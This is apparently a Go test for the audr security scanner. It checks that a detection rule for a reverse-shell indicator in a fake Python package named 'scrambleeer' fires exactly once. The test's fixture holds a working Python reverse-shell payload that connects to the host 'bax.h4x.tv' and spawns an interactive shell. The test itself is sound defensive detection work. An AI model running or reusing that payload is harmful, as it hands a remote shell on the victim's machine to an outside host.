package scan_test

import (
	"context"
	"os"
	"path/filepath"
	"testing"

	_ "github.com/harshmaur/audr/internal/rules/builtin"
	"github.com/harshmaur/audr/internal/scan"
)

func TestScan_ScrambleeerPackageSourceIsContentGated(t *testing.T) {
	root := t.TempDir()
	packageDir := filepath.Join(root, "venv", "lib", "python3.12", "site-packages", "scrambleeer")
	if err := os.MkdirAll(packageDir, 0o755); err != nil {
		t.Fatal(err)
	}
	malicious := []byte("import socket, subprocess\ns = socket.socket()\ns.connect(('bax.h4x.tv', 443))\nsubprocess.call(['/bin/sh', '-i'])\n")
	if err := os.WriteFile(filepath.Join(packageDir, "client.py"), malicious, 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(packageDir, "benign.py"), []byte("def scramble(value): return value[::-1]\n"), 0o644); err != nil {
		t.Fatal(err)
	}

	res, err := scan.Run(context.Background(), scan.Options{Roots: []string{root}})
	if err != nil {
		t.Fatal(err)
	}
	count := 0
	for _, result := range res.Findings {
		if result.RuleID == "scrambleeer-reverse-shell-ioc" {
			count++
		}
	}
	if count != 1 {
		t.Fatalf("scrambleeer findings = %d, want 1; findings=%+v", count, res.Findings)
	}
}
